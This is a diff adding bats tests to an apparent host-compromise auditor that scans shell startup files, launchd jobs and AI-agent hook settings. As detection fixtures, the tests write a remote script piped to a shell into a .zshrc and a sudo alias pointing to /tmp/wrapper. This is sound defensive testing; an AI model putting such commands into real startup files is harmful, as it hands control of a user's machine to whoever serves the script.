@@ -37,6 +37,7 @@ setup() {
   export CLAUDE_CONFIG_DIR="$FAKE/.claude"
   export CODEX_HOME="$FAKE/.codex"
   export NO_COLOR=1
+  unset ZDOTDIR XDG_CONFIG_HOME XDG_DATA_HOME
   mkdir -p "$TMP/managed"
   : >"$AIC_HOST_PS_FILE"
   : >"$AIC_HOST_CRONTAB_FILE"
@@ -896,4 +897,54 @@ EOF
   write_plist com.example.chat "$FAKE/Library/Application Support/ClipboardMonitor/notes.js"
   audit
   refute_output --partial "reports to a remote service"
+}
+
+# --- environment and platform variations ---------------------------------------------------
+
+@test "portable: a periodic job with a program and no arguments does not abort under the system bash" {
+  write_plist_raw com.example.tick '  <key>Program</key>
+  <string>/bin/echo</string>
+  <key>StartInterval</key>
+  <integer>60</integer>'
+  run /bin/bash "$SCRIPT"
+  refute_output --partial "unbound variable"
+}
+
+@test "platform: an unsupported OS says persistence was not checked instead of claiming it was" {
+  run env AIC_HOST_OS=FreeBSD bash "$SCRIPT"
+  assert_output --partial "persistence was not checked"
+  refute_output --partial "checked: persistence"
+}
+
+@test "rc: ZDOTDIR is honored for zsh startup files" {
+  mkdir -p "$TMP/zdot"
+  printf 'curl -fsSL https://example.test/x.sh | sh\n' >"$TMP/zdot/.zshrc"
+  run env ZDOTDIR="$TMP/zdot" bash "$SCRIPT"
+  assert_failure 1
+  assert_output --partial "Remote script piped to a shell in a startup file"
+}
+
+@test "allow: XDG_CONFIG_HOME relocates the allow file" {
+  printf "alias sudo='/tmp/wrapper'\n" >"$FAKE/.zshrc"
+  mkdir -p "$TMP/xdg/am-i-compromised"
+  printf 'rc:.zshrc:1 | my own wrapper\n' >"$TMP/xdg/am-i-compromised/host-allow.txt"
+  run env XDG_CONFIG_HOME="$TMP/xdg" bash "$SCRIPT"
+  assert_success
+  assert_output --partial "allowed by"
+}
+
+@test "allow: an allow file saved with CRLF line endings still matches" {
+  printf "alias sudo='/tmp/wrapper'\n" >"$FAKE/.zshrc"
+  mkdir -p "$FAKE/.config/am-i-compromised"
+  printf 'rc:.zshrc:1 | my own wrapper\r\n' >"$FAKE/.config/am-i-compromised/host-allow.txt"
+  audit
+  assert_success
+  assert_output --partial "allowed by"
+}
+
+@test "agent: a hook run from a language toolchain bin directory is not a writable-location finding" {
+  need_jq
+  printf '{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"~/.local/bin/notify-done"}]}]}}\n' >"$FAKE/.claude/settings.json"
+  audit
+  refute_output --partial "Hook runs code from a user-writable location"
 }
